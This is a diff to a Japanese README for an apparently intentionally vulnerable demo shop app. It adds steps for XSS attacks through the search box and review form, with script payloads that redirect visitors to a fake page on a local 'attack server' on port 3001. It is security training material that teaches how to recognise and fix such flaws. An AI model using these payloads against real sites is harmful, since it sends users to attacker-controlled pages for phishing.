@@ -91,6 +91,30 @@ http://localhost:3000
      - コメント: `<img src=x onerror="alert('XSS攻撃成功！')">`
    - 「レビューを投稿」をクリック
 
+### fake_page.htmlへのリダイレクト攻撃
+
+攻撃サーバー（ポート3001）のfake_page.htmlにリダイレクトさせる攻撃例：
+
+1. **検索機能でのリダイレクト:**
+   - トップページの検索ボックスに以下を入力:
+   ```
+   <script>window.location.href='http://localhost:3001/fake'</script>
+   ```
+   - または、より短い形式:
+   ```
+   <script>location.href='http://localhost:3001/fake'</script>
+   ```
+   - 検索を実行すると、自動的にfake_page.htmlにリダイレクトされます
+
+2. **レビュー投稿でのリダイレクト:**
+   - 任意の商品詳細ページに移動
+   - レビュー投稿フォームで以下を入力:
+     - お名前: `<script>location.href='http://localhost:3001/fake'</script>`
+     - またはコメント: `<script>location.href='http://localhost:3001/fake'</script>`
+   - 「レビューを投稿」をクリックすると、レビュー表示時に自動的にfake_page.htmlにリダイレクトされます
+
+**注意:** 攻撃サーバーが別のIPアドレスで動作している場合は、`localhost:3001`を適切なIPアドレスに置き換えてください（例: `http://192.168.1.100:3001/fake`）。
+
 ## セキュアな実装方法
 
 実際のアプリケーションでは、以下の対策を実装してください:
